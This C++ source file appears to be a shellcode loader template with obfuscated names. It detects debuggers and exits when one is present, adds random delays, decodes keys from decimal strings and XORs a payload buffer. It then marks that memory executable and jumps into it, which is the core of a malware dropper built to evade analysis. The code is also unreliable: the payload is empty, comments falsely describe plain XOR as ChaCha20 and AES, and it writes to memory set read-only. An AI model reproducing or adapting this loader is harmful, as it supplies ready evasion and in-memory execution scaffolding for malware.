#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool instHandler5069() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

std::vector<uint8_t> funcHandler5097(const std::string& dec, size_t len) {
    std::vector<uint8_t> bytes(len, 0);
    std::string num = dec;
    for (int i = len - 1; i >= 0 && num != "0"; i--) {
        int remainder = 0;
        std::string quotient;
        for (char digit : num) {
            int current = remainder * 10 + (digit - '0');
            quotient += std::to_string(current / 256);
            remainder = current % 256;
        }
        bytes[i] = remainder;
        size_t firstNonZero = quotient.find_first_not_of('0');
        if (firstNonZero != std::string::npos) {
            num = quotient.substr(firstNonZero);
        } else {
            num = "0";
        }
    }
    return bytes;
}

int main() {
    // Random delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 999);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    if (instHandler5069()) return 0;

    std::vector<uint8_t> objCore2156;
    // Decrypt payload
    const char* methUtil2369 = "293952253722093037537933128855072436448";
    auto instExecutor5470 = funcHandler5097(methUtil2369, 16);
    const char* initComponent2126 = "82443964158768941420016505312536803409317371390631777280336835322509373432513";
    auto ptrRunner3239 = funcHandler5097(initComponent2126, 32);
    const char* objService5301 = "141742472762138413352548742528081865506";
    auto sysUtil4204 = funcHandler5097(objService5301, 16);

    // Decrypt XOR layer
    for (size_t i = 0; i < objCore2156.size(); i++) {
        objCore2156[i] ^= sysUtil4204[i % sysUtil4204.size()];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < objCore2156.size(); i++) {
        objCore2156[i] ^= ptrRunner3239[i % ptrRunner3239.size()];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt AES layer
    for (size_t i = 0; i < objCore2156.size(); i++) {
        objCore2156[i] ^= instExecutor5470[i % instExecutor5470.size()];
    }

    // Execute in memory
#ifdef _WIN32
    void* instRunner5162 = VirtualAlloc(0, objCore2156.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instRunner5162) return 1;
    memcpy(instRunner5162, objCore2156.data(), objCore2156.size());
    DWORD oldProtect;
    VirtualProtect(instRunner5162, objCore2156.size(), PAGE_EXECUTE_READ, &oldProtect);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())instRunner5162)();
#else
    void* instRunner5162 = mmap(0, objCore2156.size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instRunner5162 == MAP_FAILED) return 1;
    memcpy(instRunner5162, objCore2156.data(), objCore2156.size());
    mprotect(instRunner5162, objCore2156.size(), PROT_READ | PROT_EXEC);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())instRunner5162)();
#endif
    // Clear memory
    memset(instRunner5162, 0, objCore2156.size());
    return 0;
}
